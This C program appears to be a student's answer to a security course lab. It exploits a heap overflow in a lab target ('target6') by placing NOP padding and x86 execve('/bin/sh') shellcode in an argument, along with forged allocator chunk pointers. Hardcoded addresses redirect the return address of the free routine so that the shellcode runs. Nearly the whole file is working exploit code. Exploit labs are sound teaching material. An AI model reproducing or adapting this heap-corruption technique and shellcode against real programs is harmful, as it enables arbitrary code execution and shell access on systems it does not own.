#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

/** 
    &q: 0x104ee78
    &p: 0x104ee28
    // we are changing the return addr of tfree instead of foo
    rip: 0x2021fe38
 */

int main(void)
{
  char *args[3];
  char *env[1];
  
  char sp_str[256];
  memset(sp_str, '\x90', 256);
  
  char _shell[] =
    // byte 5: \x91 the free bit set to 1 so that left addr branch got executed
    // change the first jump instruction's shifting (1f -> 25) so that the nops got considered
    "\xeb\x25\x90\x90\x91\x90\x90\x90\x5e\x89"
    "\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
    "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
    "\xdc\xff\xff\xff/bin/sh\x00";
  
  memcpy(sp_str, _shell, strlen(_shell));
  
  /* leftward chunk addr */
  memcpy(&sp_str[72], "\x28\xee\x04\x01", 4);
  /* rightward chunk addr */
  memcpy(&sp_str[76], "\x80\xee\x04\x01", 4);
  memcpy(&sp_str[92], "\x39\xfe\x21\x20", 4); // after clearing the free bit to 0, the addr become the same as tfree's return addr

  args[0] = TARGET; args[1] = sp_str; args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}


